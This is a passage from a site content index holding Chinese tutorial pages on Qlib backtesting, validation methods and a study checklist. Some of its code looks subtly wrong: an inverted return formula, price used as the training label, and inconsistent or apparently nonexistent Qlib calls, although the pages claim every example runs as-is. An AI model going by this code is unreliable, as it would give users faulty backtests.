print(f&quot;  {key}: {value:.4f}&quot;)\n总结\n绩效评估是量化投资的重要环节：\n\n收益率指标：总收益、年化收益、超额收益\n风险指标：波动率、最大回撤、VaR\n风险调整收益指标：夏普比率、信息比率、卡尔马比率\n交易相关指标：换手率、胜率、盈亏比\n\n建议：\n\n综合使用多个指标评估策略\n关注风险调整后收益\n考虑交易成本影响\n进行样本外验证\n"},"quant/qlib/week3/05-实验分析方法":{"slug":"quant/qlib/week3/05-实验分析方法","filePath":"quant/qlib/week3/05-实验分析方法.md","title":"05-实验分析方法","links":[],"tags":[],"content":"实验分析方法\n1. 参数敏感性分析\n1.1 单参数敏感性\ndef single_parameter_sensitivity(strategy, param_name, param_values, \n                                   data, backtest_func):\n    &quot;&quot;&quot;\n    单参数敏感性分析\n    \n    参数:\n        strategy: 策略函数\n        param_name: 参数名\n        param_values: 参数值列表\n        data: 回测数据\n        backtest_func: 回测函数\n    \n    返回:\n        results: 分析结果\n    &quot;&quot;&quot;\n    results = []\n    \n    for value in param_values:\n        # 设置参数\n        params = {param_name: value}\n        \n        # 回测\n        performance = backtest_func(strategy, data, params)\n        \n        results.append({\n            param_name: value,\n            &#039;return&#039;: performance[&#039;return&#039;],\n            &#039;sharpe&#039;: performance[&#039;sharpe&#039;],\n            &#039;max_drawdown&#039;: performance[&#039;max_drawdown&#039;]\n        })\n    \n    return pd.DataFrame(results)\n \n# 示例：分析K值对Top-K策略的影响\nk_values = [10, 20, 30, 40, 50]\nresults = single_parameter_sensitivity(\n    topk_strategy, &#039;k&#039;, k_values, \n    returns_data, backtest\n)\n1.2 多参数敏感性\ndef multi_parameter_sensitivity(strategy, param_grid, data, backtest_func):\n    &quot;&quot;&quot;\n    多参数敏感性分析\n    \n    参数:\n        strategy: 策略函数\n        param_grid: 参数网格\n        data: 回测数据\n        backtest_func: 回测函数\n    \n    返回:\n        results: 分析结果\n    &quot;&quot;&quot;\n    from itertools import product\n    \n    # 生成所有参数组合\n    param_combinations = list(product(*param_grid.values()))\n    \n    results = []\n    \n    for combination in param_combinations:\n        # 设置参数\n        params = dict(zip(param_grid.keys(), combination))\n        \n        # 回测\n        performance = backtest_func(strategy, data, params)\n        \n        results.append({\n            **params,\n            &#039;sharpe&#039;: performance[&#039;sharpe&#039;],\n            &#039;return&#039;: performance[&#039;return&#039;]\n        })\n    \n    return pd.DataFrame(results)\n \n# 示例\nparam_grid = {\n    &#039;k&#039;: [20, 30, 40],\n    &#039;risk_aversion&#039;: [0.5, 1.0, 2.0],\n    &#039;max_weight&#039;: [0.05, 0.1, 0.15]\n}\n \nresults = multi_parameter_sensitivity(mv_strategy, param_grid, returns_data, backtest)\n1.3 敏感性热力图\nimport seaborn as sns\nimport matplotlib.pyplot as plt\n \ndef plot_sensitivity_heatmap(results, pivot_col, pivot_row, value_col):\n    &quot;&quot;&quot;\n    绘制敏感性热力图\n    \n    参数:\n        results: 分析结果\n        pivot_col: 列参数\n        pivot_row: 行参数\n        value_col: 值参数\n    \n    返回:\n        fig: 图形对象\n    &quot;&quot;&quot;\n    # 创建透视表\n    pivot_table = results.pivot(\n        index=pivot_row,\n        columns=pivot_col,\n        values=value_col\n    )\n    \n    # 绘制热力图\n    fig, ax = plt.subplots(figsize=(10, 8))\n    sns.heatmap(pivot_table, annot=True, fmt=&#039;.3f&#039;, \n                cmap=&#039;RdYlGn&#039;, center=0, ax=ax)\n    \n    ax.set_title(f&#039;{value_col} Sensitivity&#039;)\n    plt.tight_layout()\n    \n    return fig\n \n# 示例\nfig = plot_sensitivity_heatmap(results, &#039;risk_aversion&#039;, &#039;k&#039;, &#039;sharpe&#039;)\nplt.show()\n2. 持仓周期研究\n2.1 调仓频率类型\n日频调仓：每天调整持仓\n\n优点：及时反映市场变化\n缺点：交易成本高\n\n周频调仓：每周调整持仓\n\n平衡成本和及时性\n常用频率\n\n月频调仓：每月调整持仓\n\n优点：成本低\n缺点：反应滞后\n\n2.2 持仓周期分析\ndef holding_period_study(predictions, holding_periods=[1, 5, 20]):\n    &quot;&quot;&quot;\n    持仓周期研究\n    \n    参数:\n        predictions: 预测分数\n        holding_periods: 持仓周期列表（天数）\n    \n    返回:\n        results: 分析结果\n    &quot;&quot;&quot;\n    results = []\n    \n    for period in holding_periods:\n        # 生成持仓信号（每period天调仓一次）\n        signals = generate_signals(predictions, rebalance_freq=period)\n        \n        # 回测\n        performance = backtest(signals)\n        \n        results.append({\n            &#039;holding_period&#039;: period,\n            &#039;return&#039;: performance[&#039;return&#039;],\n            &#039;sharpe&#039;: performance[&#039;sharpe&#039;],\n            &#039;turnover&#039;: performance[&#039;turnover&#039;]\n        })\n    \n    return pd.DataFrame(results)\n \n# 示例\nholding_periods = [1, 5, 10, 20]  # 1天、1周、2周、1月\nresults = holding_period_study(predictions, holding_periods)\n3. 样本外验证\n3.1 滚动窗口验证\ndef rolling_window_backtest(data, strategy_func, \n                               window_size=252, test_size=63):\n    &quot;&quot;&quot;\n    滚动窗口验证\n    \n    参数:\n        data: 数据\n        strategy_func: 策略函数\n        window_size: 训练窗口大小\n        test_size: 测试窗口大小\n    \n    返回:\n        results: 验证结果\n    &quot;&quot;&quot;\n    results = []\n    \n    for i in range(window_size, len(data), test_size):\n        # 训练集\n        train_data = data[i-window_size:i]\n        \n        # 测试集\n        test_data = data[i:i+test_size]\n        \n        # 训练模型\n        model = train_model(train_data)\n        \n        # 生成预测\n        predictions = model.predict(test_data)\n        \n        # 回测\n        performance = backtest(predictions, test_data)\n        \n        results.append({\n            &#039;test_start&#039;: test_data.index[0],\n            &#039;test_end&#039;: test_data.index[-1],\n            &#039;return&#039;: performance[&#039;return&#039;],\n            &#039;sharpe&#039;: performance[&#039;sharpe&#039;]\n        })\n    \n    return pd.DataFrame(results)\n \n# 示例\nresults = rolling_window_backtest(data, strategy_func, \n                                 window_size=252, test_size=63)\n3.2 扩展窗口验证\ndef expanding_window_backtest(data, strategy_func, \n                                initial_size=252, test_size=63):\n    &quot;&quot;&quot;\n    扩展窗口验证\n    \n    参数:\n        data: 数据\n        strategy_func: 策略函数\n        initial_size: 初始训练集大小\n        test_size: 测试窗口大小\n    \n    返回:\n        results: 验证结果\n    &quot;&quot;&quot;\n    results = []\n    \n    for i in range(initial_size, len(data), test_size):\n        # 训练集（不断扩大）\n        train_data = data[:i]\n        \n        # 测试集\n        test_data = data[i:i+test_size]\n        \n        # 训练模型\n        model = train_model(train_data)\n        \n        # 生成预测\n        predictions = model.predict(test_data)\n        \n        # 回测\n        performance = backtest(predictions, test_data)\n        \n        results.append({\n            &#039;test_start&#039;: test_data.index[0],\n            &#039;test_end&#039;: test_data.index[-1],\n            &#039;train_size&#039;: len(train_data),\n            &#039;return&#039;: performance[&#039;return&#039;],\n            &#039;sharpe&#039;: performance[&#039;sharpe&#039;]\n        })\n    \n    return pd.DataFrame(results)\n \n# 示例\nresults = expanding_window_backtest(data, strategy_func, \n                                  initial_size=252, test_size=63)\n4. 避免过拟合\n4.1 样本外验证\ndef out_of_sample_validation(data, split_ratio=0.7):\n    &quot;&quot;&quot;\n    样本外验证\n    \n    参数:\n        data: 数据\n        split_ratio: 训练集比例\n    \n    返回:\n        train_data: 训练集\n        test_data: 测试集\n    &quot;&quot;&quot;\n    # 划分数据\n    split_idx = int(len(data) * split_ratio)\n    \n    train_data = data[:split_idx]\n    test_data = data[split_idx:]\n    \n    return train_data, test_data\n \n# 使用示例\ntrain_data, test_data = out_of_sample_validation(data, split_ratio=0.7)\n \n# 训练模型\nmodel = train_model(train_data)\n \n# 测试模型\npredictions = model.predict(test_data)\nperformance = evaluate(predictions, test_data)\n4.2 参数限制\n# ❌ 错误做法：过度优化\nparams = {\n    &#039;k&#039;: 23,\n    &#039;lookback&#039;: 17,\n    &#039;threshold&#039;: 0.032,\n    &#039;smoothing&#039;: 0.7,\n    # ... 太多参数\n}\n \n# ✅ 正确做法：少量关键参数\nparams = {\n    &#039;k&#039;: 20,        # 清晰的含义\n    &#039;lookback&#039;: 20   # 基于经济逻辑\n}\n4.3 交叉验证\nfrom sklearn.model_selection import TimeSeriesSplit\n \ndef time_series_cv(X, y, model_func, n_splits=5):\n    &quot;&quot;&quot;\n    时间序列交叉验证\n    \n    参数:\n        X: 特征\n        y: 目标\n        model_func: 模型函数\n        n_splits: 折数\n    \n    返回:\n        scores: 每折的分数\n    &quot;&quot;&quot;\n    tscv = TimeSeriesSplit(n_splits=n_splits)\n    scores = []\n    \n    for train_idx, test_idx in tscv.split(X):\n        X_train, X_test = X[train_idx], X[test_idx]\n        y_train, y_test = y[train_idx], y[test_idx]\n        \n        # 训练模型\n        model = model_func()\n        model.fit(X_train, y_train)\n        \n        # 预测\n        y_pred = model.predict(X_test)\n        \n        # 评估\n        score = evaluate(y_pred, y_test)\n        scores.append(score)\n    \n    return scores\n \n# 示例\nscores = time_series_cv(X, y, model_func, n_splits=5)\nprint(f&quot;平均分数: {np.mean(scores):.4f}&quot;)\nprint(f&quot;标准差: {np.std(scores):.4f}&quot;)\n总结\n实验分析是验证策略有效性的关键：\n\n参数敏感性：了解参数变化的影响\n持仓周期：研究调仓频率的影响\n样本外验证：防止过拟合\n交叉验证：提高结果的可靠性\n\n建议：\n\n务必进行样本外验证\n使用多种验证方法\n关注参数稳定性\n避免过度优化\n"},"quant/qlib/week3/06-回测流程与实践":{"slug":"quant/qlib/week3/06-回测流程与实践","filePath":"quant/qlib/week3/06-回测流程与实践.md","title":"06-回测流程与实践","links":[],"tags":[],"content":"回测流程与实践\n1. Qlib 回测框架\n1.1 回测架构\n# 1. 数据准备\ndata = qlib.data.get_data(start_date, end_date)\n \n# 2. 模型训练\nmodel = train_model(train_data)\n \n# 3. 策略定义\nstrategy = Strategy(model)\n \n# 4. 回测配置\nconfig = {\n    &#039;executor&#039;: SimulatorExecutor(...),\n    &#039;account&#039;: 1000000,\n    &#039;benchmark&#039;: &#039;SPY&#039;\n}\n \n# 5. 执行回测\nresult = qlib.backtest.run(\n    strategy=strategy,\n    data=data,\n    config=config\n)\n \n# 6. 分析结果\nmetrics = qlib.backtest.analyze(result)\n1.2 Qlib 回测流程\n1. 初始化Qlib\n   ↓\n2. 加载数据\n   ↓\n3. 训练模型\n   ↓\n4. 定义策略\n   ↓\n5. 配置Executor\n   ↓\n6. 执行回测\n   ↓\n7. 分析结果\n   ↓\n8. 生成报告\n\n2. 完整回测步骤\n2.1 Step 1: 数据准备\nimport qlib\nfrom qlib.constant import REG_CN\n \n# 初始化Qlib\nqlib.init(provider_uri=&#039;~/.qlib/qlib_data/cn_data&#039;, region=REG_CN)\n \n# 获取股票列表\ninstruments = qlib.get_instruments(&#039;csi300&#039;)\n \n# 获取数据\nfrom qlib.data import D\n \ndata = D.features(\n    instruments,\n    fields=[&#039;$close&#039;, &#039;$volume&#039;, &#039;$factor&#039;],\n    start_time=&#039;2020-01-01&#039;,\n    end_time=&#039;2022-12-31&#039;\n)\n2.2 Step 2: 特征工程\n# 定义特征\nfeatures = [\n    &#039;$close&#039;,\n    &#039;$volume&#039;,\n    &#039;Ref($close, 1)/Ref($close, 0) - 1&#039;,  # 收益率\n    &#039;Mean($close, 5)&#039;,  # 5日均线\n    &#039;Std($close, 20)&#039;  # 20日波动率\n]\n \n# 计算特征\nfeature_data = D.features(\n    instruments,\n    fields=features,\n    start_time=&#039;2020-01-01&#039;,\n    end_time=&#039;2022-12-31&#039;\n)\n2.3 Step 3: 模型训练\n# 定义标签\nlabel = &#039;Ref($close, 2)/Ref($close, 1) - 1&#039;\n \n# 划分数据集\ntrain_data = feature_data[&#039;2020-01-01&#039;:&#039;2021-12-31&#039;]\ntest_data = feature_data[&#039;2022-01-01&#039;:&#039;2022-12-31&#039;]\n \n# 训练模型\nimport lightgbm as lgb\n \nmodel = lgb.LGBMRegressor(\n    n_estimators=100,\n    max_depth=6,\n    learning_rate=0.1,\n    random_state=42\n)\n \nmodel.fit(\n    train_data[features].values,\n    train_data[label].values\n)\n \n# 生成预测\npredictions = model.predict(test_data[features].values)\n2.4 Step 4: 策略定义\ndef topk_strategy(predictions, k=20):\n    &quot;&quot;&quot;\n    Top-K投资组合策略\n    \n    参数:\n        predictions: 预测分数\n        k: 选择股票数量\n    \n    返回:\n        weights: 股票权重\n    &quot;&quot;&quot;\n    # 按预测分数排序\n    sorted_predictions = predictions.sort_values(ascending=False)\n    \n    # 选择Top-K\n    topk = sorted_predictions[:k]\n    \n    # 等权重\n    weight = 1.0 / k\n    \n    # 分配权重\n    weights = pd.Series(0, index=predictions.index)\n    weights[topk.index] = weight\n    \n    return weights\n2.5 Step 5: 配置 Executor\nfrom qlib.backtest.executor import SimulatorExecutor\nfrom qlib.backtest.backtest import backtest_executor\n \n# Executor配置\nexecutor_config = {\n    &#039;time_per_step&#039;: &#039;day&#039;,\n    &#039;generate_portfolio_metrics&#039;: True\n}\n \n# 交易所配置\nexchange = {\n    &#039;freq&#039;: &#039;day&#039;,\n    &#039;limit_threshold&#039;: 0.095,\n    &#039;deal_price&#039;: &#039;close&#039;,\n    &#039;open_cost&#039;: 0.0005,  # 买入费率万分之五\n    &#039;close_cost&#039;: 0.0015,  # 卖出费率千分之1.5\n    &#039;min_cost&#039;: 5  # 最低手续费5元\n}\n \n# 创建Executor\nexecutor = SimulatorExecutor(\n    exchange=exchange,\n    **executor_config\n)\n2.6 Step 6: 执行回测\nfrom qlib.backtest import backtest\n \n# 执行回测\nportfolio_metrics, indicators = backtest(\n    executor=executor,\n    strategy=lambda x: topk_strategy(x, k=20),\n    test_data=test_data\n)\n \n# 获取结果\nprint(&quot;回测结果:&quot;)\nprint(f&quot;总收益率: {portfolio_metrics[&#039;return&#039;]:.4f}&quot;)\nprint(f&quot;年化收益率: {portfolio_metrics[&#039;annualized_return&#039;]:.4f}&quot;)\nprint(f&quot;夏普比率: {indicators[&#039;sharpe_ratio&#039;]:.4f}&quot;)\nprint(f&quot;最大回撤: {indicators[&#039;max_drawdown&#039;]:.4f}&quot;)\n2.7 Step 7: 分析结果\nimport matplotlib.pyplot as plt\n \n# 绘制累计收益曲线\nplt.figure(figsize=(12, 6))\nplt.plot(portfolio_metrics[&#039;cumulative_return&#039;].index,\n         portfolio_metrics[&#039;cumulative_return&#039;].values,\n         label=&#039;Strategy&#039;)\nplt.title(&#039;Cumulative Return&#039;)\nplt.xlabel(&#039;Date&#039;)\nplt.ylabel(&#039;Cumulative Return&#039;)\nplt.legend()\nplt.grid(True, alpha=0.3)\nplt.show()\n \n# 绘制回撤曲线\nplt.figure(figsize=(12, 6))\nplt.plot(indicators[&#039;drawdown&#039;].index,\n         indicators[&#039;drawdown&#039;].values,\n         color=&#039;red&#039;)\nplt.fill_between(indicators[&#039;drawdown&#039;].index,\n                 indicators[&#039;drawdown&#039;].values, 0,\n                 alpha=0.3, color=&#039;red&#039;)\nplt.title(&#039;Drawdown&#039;)\nplt.xlabel(&#039;Date&#039;)\nplt.ylabel(&#039;Drawdown&#039;)\nplt.grid(True, alpha=0.3)\nplt.show()\n3. 完整回测示例\nimport qlib\nfrom qlib.constant import REG_CN\nfrom qlib.data import D\nfrom qlib.backtest.executor import SimulatorExecutor\nfrom qlib.backtest import backtest\nimport lightgbm as lgb\nimport pandas as pd\nimport numpy as np\n \n# 1. 初始化Qlib\nqlib.init(provider_uri=&#039;~/.qlib/qlib_data/cn_data&#039;, region=REG_CN)\n \n# 2. 获取数据\ninstruments = qlib.get_instruments(&#039;csi300&#039;)\n \n# 3. 定义特征\nfeatures = [\n    &#039;$close&#039;,\n    &#039;Ref($close, 1)/Ref($close, 0) - 1&#039;,\n    &#039;Mean($close, 5)&#039;,\n    &#039;Std($close, 20)&#039;\n]\n \n# 4. 获取数据\ndata = D.features(\n    instruments,\n    fields=features,\n    start_time=&#039;2020-01-01&#039;,\n    end_time=&#039;2022-12-31&#039;\n)\n \n# 5. 划分数据集\ntrain_data = data[&#039;2020-01-01&#039;:&#039;2021-12-31&#039;]\ntest_data = data[&#039;2022-01-01&#039;:&#039;2022-12-31&#039;]\n \n# 6. 训练模型\nmodel = lgb.LGBMRegressor(\n    n_estimators=100,\n    max_depth=6,\n    learning_rate=0.1\n)\nmodel.fit(train_data[features], train_data[&#039;$close&#039;])\n \n# 7. 生成预测\npredictions = model.predict(test_data[features])\npredictions = pd.Series(predictions, index=test_data.index)\n \n# 8. 定义策略\ndef strategy(pred):\n    sorted_pred = pred.sort_values(ascending=False)\n    top20 = sorted_pred[:20]\n    weights = pd.Series(0, index=pred.index)\n    weights[top20.index] = 1.0/20\n    return weights\n \n# 9. 配置Executor\nexchange = {\n    &#039;freq&#039;: &#039;day&#039;,\n    &#039;limit_threshold&#039;: 0.095,\n    &#039;deal_price&#039;: &#039;close&#039;,\n    &#039;open_cost&#039;: 0.0005,\n    &#039;close_cost&#039;: 0.0015,\n    &#039;min_cost&#039;: 5\n}\n \nexecutor = SimulatorExecutor(exchange=exchange)\n \n# 10. 执行回测\nportfolio_metrics, indicators = backtest(\n    executor=executor,\n    strategy=strategy,\n    test_data=test_data\n)\n \n# 11. 输出结果\nprint(&quot;回测完成！&quot;)\nprint(f&quot;总收益率: {portfolio_metrics[&#039;return&#039;]:.4f}&quot;)\nprint(f&quot;年化收益率: {portfolio_metrics[&#039;annualized_return&#039;]:.4f}&quot;)\nprint(f&quot;夏普比率: {indicators[&#039;sharpe_ratio&#039;]:.4f}&quot;)\nprint(f&quot;最大回撤: {indicators[&#039;max_drawdown&#039;]:.4f}&quot;)\n4. 实践建议\n4.1 回测原则\n\n\n简单开始\n\n从简单策略开始\n逐步增加复杂度\n理解每个环节\n\n\n\n严格验证\n\n使用样本外验证\n多时间段验证\n成本敏感性分析\n\n\n\n风险控制\n\n设置止损机制\n分散投资\n限制单股权重\n\n\n\n4.2 常见错误\n\n\n未来函数\n\n使用未来数据\n数据泄露\n解决方案：检查数据对齐\n\n\n\n成本低估\n\n忽略交易成本\n滑点和市场冲击\n解决方案：使用合理的成本参数\n\n\n\n过拟合\n\n过度优化参数\n样本内表现好，样本外差\n解决方案：样本外验证\n\n\n\n4.3 最佳实践\n# ✅ 正确做法\n \n# 1. 使用样本外验证\ntrain_data = data[&#039;2020&#039;:&#039;2021&#039;]\ntest_data = data[&#039;2022&#039;]\n \n# 2. 使用合理的成本参数\nexchange = {\n    &#039;open_cost&#039;: 0.0005,\n    &#039;close_cost&#039;: 0.0015,\n    &#039;min_cost&#039;: 5\n}\n \n# 3. 分散投资\ndef strategy(pred):\n    top30 = pred.nlargest(30)\n    weights = pd.Series(0, index=pred.index)\n    weights[top30.index] = 1.0/30\n    return weights\n \n# 4. 风险控制\nmax_weight = 0.1\nweights = weights.clip(upper=max_weight)\nweights = weights / weights.sum()\n \n# ❌ 错误做法\n \n# 1. 使用全部数据训练和测试\nmodel = Model()\nmodel.fit(data, labels)  # 使用全部数据\npredictions = model.predict(data)  # 在相同数据上预测\n \n# 2. 忽略交易成本\nexchange = {\n    &#039;open_cost&#039;: 0,\n    &#039;close_cost&#039;: 0\n}\n \n# 3. 集中投资\ndef strategy(pred):\n    top5 = pred.nlargest(5)  # 只选5只\n    weights = pd.Series(0, index=pred.index)\n    weights[top5.index] = 1.0/5\n    return weights  # 单股权重20%\n总结\n完整的回测流程包括：\n\n数据准备：加载和清洗数据\n特征工程：计算特征和标签\n模型训练：训练预测模型\n策略定义：定义交易策略\n回测配置：配置Executor\n执行回测：运行回测\n分析结果：评估策略表现\n\n建议：\n\n从简单策略开始\n严格验证\n控制风险\n避免常见错误\n"},"quant/qlib/week3/07-学习检查清单":{"slug":"quant/qlib/week3/07-学习检查清单","filePath":"quant/qlib/week3/07-学习检查清单.md","title":"07-学习检查清单","links":[],"tags":[],"content":"学习检查清单\n📋 学习目标检查\n✅ 交易策略理论\n\n\n 理解交易策略的核心组成\n\n能解释信号生成、仓位管理、风险控制、执行规则\n能画出完整的策略工作流程图\n\n\n\n 掌握IC、换手率、回撤等基础概念\n\n能计算IC和信息比率\n能计算换手率和回撤\n理解各指标的含义\n\n\n\n 理解Top-K策略原理\n\n能实现Top-K均等权重策略\n了解K值选择的影响\n知道Top-K策略的优缺点\n\n\n\n 理解IC权重策略\n\n能计算滚动IC\n能实现IC权重分配\n了解IC权重策略的适用场景\n\n\n\n 了解均值-方差优化（MVO）\n\n理解马科维茨理论\n能使用CVXPY求解MV优化\n了解有效前沿的概念\n\n\n\n✅ 投资组合构建方法\n\n\n 能实现Top-K均等权重\n\n能编写完整的策略代码\n能分析K值敏感性\n能优化调仓频率\n\n\n\n 能实现IC权重分配\n\n能计算历史IC\n能实现权重平滑\n能限制单股权重\n\n\n\n 能实现MV优化\n\n能估计期望收益和协方差矩阵\n能添加约束条件\n能进行正则化处理\n\n\n\n 能对比三种方法\n\n能从性能、复杂度、风险等维度对比\n能选择合适的方法\n能结合多种方法\n\n\n\n✅ Executor与成本模型\n\n\n 理解Executor机制\n\n能解释Executor的工作原理\n能实现简单的Executor\n能管理持仓和交易\n\n\n\n 掌握交易成本模型\n\n能计算手续费\n能计算滑点成本\n能计算市场冲击\n\n\n\n 能进行成本敏感性分析\n\n能测试不同成本参数的影响\n能分析换手率与成本的关系\n能优化策略降低成本\n\n\n\n✅ 绩效评估指标\n\n\n 能计算收益率指标\n\n能计算总收益率\n能计算年化收益率\n能计算超额收益率\n\n\n\n 能计算风险指标\n\n能计算波动率\n能计算最大回撤\n能计算VaR\n\n\n\n 能计算风险调整收益指标\n\n能计算夏普比率\n能计算信息比率\n能计算卡尔马比率\n\n\n\n 能计算交易相关指标\n\n能计算换手率\n能计算胜率\n能计算盈亏比\n\n\n\n✅ 实验分析方法\n\n\n 能进行参数敏感性分析\n\n能实现单参数敏感性分析\n能实现多参数敏感性分析\n能绘制敏感性热力图\n\n\n\n 能进行持仓周期研究\n\n能测试不同调仓频率\n能分析持仓周期的影响\n能选择最优调仓频率\n\n\n\n 能进行样本外验证\n\n能实现滚动窗口验证\n能实现扩展窗口验证\n能进行时间序列交叉验证\n\n\n\n✅ 回测流程与实践\n\n\n 能使用Qlib框架\n\n能初始化Qlib\n能加载数据\n能进行特征工程\n\n\n\n 能完成完整回测\n\n能训练模型\n能定义策略\n能配置Executor\n能执行回测\n能分析结果\n\n\n\n 能避免常见错误\n\n能避免未来函数\n能正确处理成本\n能防止过拟合\n\n\n\n🎯 实践能力检查\n✅ 能独立完成的项目\n\n\n 项目1: Top-K策略回测\n\n实现Top-K策略\n完成完整回测\n分析策略表现\n\n\n\n 项目2: IC权重策略\n\n计算历史IC\n实现IC权重策略\n对比Top-K策略\n\n\n\n 项目3: MV优化策略\n\n估计收益和风险\n求解MV优化\n分析组合特征\n\n\n\n 项目4: 参数优化\n\n进行参数敏感性分析\n寻找最优参数组合\n验证参数稳定性\n\n\n\n 项目5: 成本分析\n\n进行成本敏感性测试\n优化策略降低成本\n分析成本对收益的影响\n\n\n\n✅ 能回答的问题\n\n\n为什么需要回测？\n\n验证策略有效性\n评估策略风险\n优化策略参数\n\n\n\nTop-K、IC权重、MV优化，哪个更好？\n\n没有绝对最好的方法\n根据实际情况选择\n都需要学习和理解\n\n\n\n交易成本有多大影响？\n\n影响可能非常大\n高换手率策略对成本更敏感\n务必做成本敏感性分析\n\n\n\n如何避免过拟合？\n\n使用样本外验证\n限制参数数量\n简化策略逻辑\n\n\n\n哪些指标最重要？\n\n夏普比率：风险调整后收益\n最大回撤：最大损失\nIC：预测能力\n换手率：交易活跃度\n\n\n\n📚 学习路径\n🟢 初学者路径\n1. 交易策略理论\n   ↓\n2. Top-K策略实现\n   ↓\n3. 绩效评估指标\n   ↓\n4. 简单回测\n\n🟡 进阶路径\n1. IC权重策略\n   ↓\n2. MV优化方法\n   ↓\n3. 参数敏感性分析\n   ↓\n4. 样本外验证\n\n🔴 实战路径\n1. 完整Qlib回测\n   ↓\n2. 策略优化\n   ↓\n3. 成本控制\n   ↓\n4. 实盘验证\n\n🔧 工具箱\n必备 Python 库\nimport qlib              # 量化投资框架\nimport pandas as pd       # 数据处理\nimport numpy as np        # 数值计算\nimport lightgbm as lgb    # 梯度提升树\nimport cvxpy as cp        # 凸优化\nimport matplotlib.pyplot as plt  # 可视化\nimport seaborn as sns     # 统计绘图\n常用代码片段\n1. Top-K策略\ndef topk_strategy(predictions, k=20):\n    sorted_pred = predictions.sort_values(ascending=False)\n    topk = sorted_pred[:k]\n    weight = 1.0 / k\n    weights = pd.Series(0, index=predictions.index)\n    weights[topk.index] = weight\n    return weights\n2. IC计算\nfrom scipy.stats import spearmanr\n \ndef calculate_ic(predictions, returns):\n    ic, _ = spearmanr(predictions, returns)\n    return ic\n3. MV优化\ndef mv_optimization(returns, risk_aversion=1.0, max_weight=0.1):\n    n = len(returns.columns)\n    w = cp.Variable(n)\n    \n    mu = returns.mean().values\n    sigma = returns.cov().values\n    sigma_reg = sigma + 1e-6 * np.eye(n)\n    \n    objective = cp.Maximize(mu @ w - risk_aversion * cp.quad_form(w, sigma_reg))\n    constraints = [cp.sum(w) == 1, w &gt;= 0, w &lt;= max_weight]\n    \n    problem = cp.Problem(objective, constraints)\n    problem.solve()\n    \n    return pd.Series(w.value, index=returns.columns)\n4. 绩效评估\ndef evaluate_portfolio(returns, benchmark_returns=None):\n    cumulative_returns = returns.cumsum()\n    \n    metrics = {}\n    metrics[&#039;total_return&#039;] = cumulative_returns.iloc[-1]\n    metrics[&#039;volatility&#039;] = returns.std() * np.sqrt(252)\n    \n    _, max_drawdown = calculate_max_drawdown(cumulative_returns)\n    metrics[&#039;max_drawdown&#039;] = max_drawdown\n    \n    sharpe = returns.mean() / returns.std() * np.sqrt(252)\n    metrics[&#039;sharpe_ratio&#039;] = sharpe\n    \n    return metrics\n🚀 下一步学习\n完成 Week 4 后，你已经掌握了：\n✅ 交易策略理论\n✅ 投资组合构建方法\n✅ Executor与成本模型\n✅ 绩效评估指标\n✅ 实验分析方法\n✅ 完整回测流程\n下一步：实战应用\n你将学习：\n\n完整策略开发\n实盘风险管理\n策略监控系统\n持续优化改进\n\n\n祝学习顺利！ 🎉"},"quant/qlib/week3/index":{"slug":"quant/qlib/week3/index","filePath":"quant/qlib/week3/index.md","title":"index","links":["quant/qlib/week3/01-交易策略理论","quant/qlib/week3/02-投资组合构建方法","quant/qlib/week3/03-Executor与成本模型","quant/qlib/week3/04-绩效评估指标","quant/qlib/week3/05-实验分析方法","quant/qlib/week3/06-回测流程与实践","/"],"tags":[],"content":"回测引擎与策略实战\n回测（Backtesting）是量化投资的核心环节，通过历史数据验证交易策略的有效性。本模块系统讲解了回测引擎、投资组合构建、绩效评估等关键内容。\n\n📖 文档目录\n1️⃣ 交易策略理论\n→ 阅读完整文档\n核心内容：\n\nTop-K策略原理与实现\nIC权重分配方法\n均值-方差优化（MVO）\n三种方法对比分析\n\n适合人群：想要理解交易策略基础的学习者\n\n2️⃣ 投资组合构建方法\n→ 阅读完整文档\n核心内容：\n\nTop-K均等权重算法\nIC权重分配算法\n均值-方差优化求解\n参数选择与调优\n\n适合人群：需要实现投资组合构建的开发者\n\n3️⃣ Executor与成本模型\n→ 阅读完整文档\n核心内容：\n\nExecutor机制详解\n交易成本模型（手续费、滑点、市场冲击）\n成本敏感性分析\n成本参数配置\n\n适合人群：需要理解交易成本的研究者\n\n4️⃣ 绩效评估指标\n→ 阅读完整文档\n核心内容：\n\n收益率指标（总收益、年化收益、超额收益）\n风险指标（波动率、最大回撤、VaR）\n风险调整收益指标（夏普比率、信息比率、卡尔马比率）\n交易相关指标（换手率、胜率、盈亏比）\n\n适合人群：需要评估策略表现的分析师\n\n5️⃣ 实验分析方法\n→ 阅读完整文档\n核心内容：\n\n参数敏感性分析\n持仓周期研究\n样本外验证方法\n滚动窗口验证\n\n适合人群：需要优化和验证策略的研究者\n\n6️⃣ 回测流程与实践\n→ 阅读完整文档\n核心内容：\n\nQlib回测框架详解\n完整回测步骤\n数据准备与特征工程\n策略定义与执行\n结果分析与报告\n\n适合人群：需要完成完整回测的实践者\n\n🎯 学习路径\n🟢 初学者路径\n交易策略理论 → 投资组合构建 → 绩效评估 → 回测流程\n\n目标：理解回测基本概念，能够完成简单策略回测\n🟡 进阶路径\n成本模型 → 参数敏感性 → 样本外验证 → 策略优化\n\n目标：深入理解回测细节，能够优化和验证策略\n🔴 实战路径\n从实际项目出发 → 遇到问题查文档 → 理论学习 → 实践应用\n\n目标：解决实际问题，积累实战经验\n\n📚 学习前准备\n必备知识\n\n\n Python 编程基础\n\n数据处理（pandas, numpy）\n可视化（matplotlib, seaborn）\n\n\n\n 机器学习基础\n\nLightGBM 模型训练\nIC/ICIR 评估指标\n\n\n\n 量化投资基础\n\n特征工程（Qlib）\n时序数据划分\n\n\n\n推荐顺序\n\n先学习 特征工程模块 和 LightGBM 模块\n再学习本回测模块\n最后进行实战练习\n\n\n💡 实用提示\n\n文档示例：所有代码示例均可直接运行\n实战导向：内容针对量化投资实战设计\n最佳实践：包含大量实战经验总结\n持续更新：跟随最新技术发展\n\n\n🔗 相关资源\n官方文档：\n\nQlib 官方文档\nLightGBM 官方文档\n\n开源项目：\n\nQlib GitHub\nQuantopian Zipline\n\n学习资源：\n\nQuantStart 量化教程\nQuantopian 讲座\n\n\n← 返回首页"},"quant/qlib/week5/01_基础理论系列/index":{"slug":"quant/qlib/week5/01_基础理论系列/index","filePath":"quant/qlib/week5/01_基础理论系列/index.md","title":"index","links":["02_PyTorch框架系列/"],"tags":[],"content":"基础理论系列 - RNN与LSTM原理\n📚 系列概述\n本系列文档涵盖深度学习基础、序列数据处理、RNN与LSTM的核心原理和数学基础。\n\n📖 文档列表\n\n深度学习基础\n序列数据与RNN\nLSTM原理详解\n\n\n深度学习基础\n核心概念\n1. 深度学习定义\n\n本质: 